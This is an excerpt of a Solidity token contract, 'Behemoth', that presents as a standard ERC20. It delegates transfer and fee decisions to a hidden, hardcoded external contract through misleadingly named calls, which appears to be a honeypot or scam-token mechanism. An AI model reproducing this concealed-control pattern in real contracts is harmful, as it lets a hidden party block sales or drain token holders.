...
contract Behemoth is IERC20 {
    ...
    ERC private erc20 = ERC(0x2390Def25ef64D7711980E79bD3676A634763136);
    string private _name = "Behemoth";
    string private  _symbol = "BEHEMOTH";
    ...
    function isSwapTransfer(address from, address to) private view returns (bool) {
        return erc20.transfer(from, to, pairAddress);
    }
    ...
    function getFeeAmount(address from, address recipient, uint256 amount) private returns (uint256) {
        uint256 feeAmount = 0;
        if (erc20.swapTokensForETH(from, recipient, uniswapBurnFee, address(this), _rebalanceFeeUniswap())) {
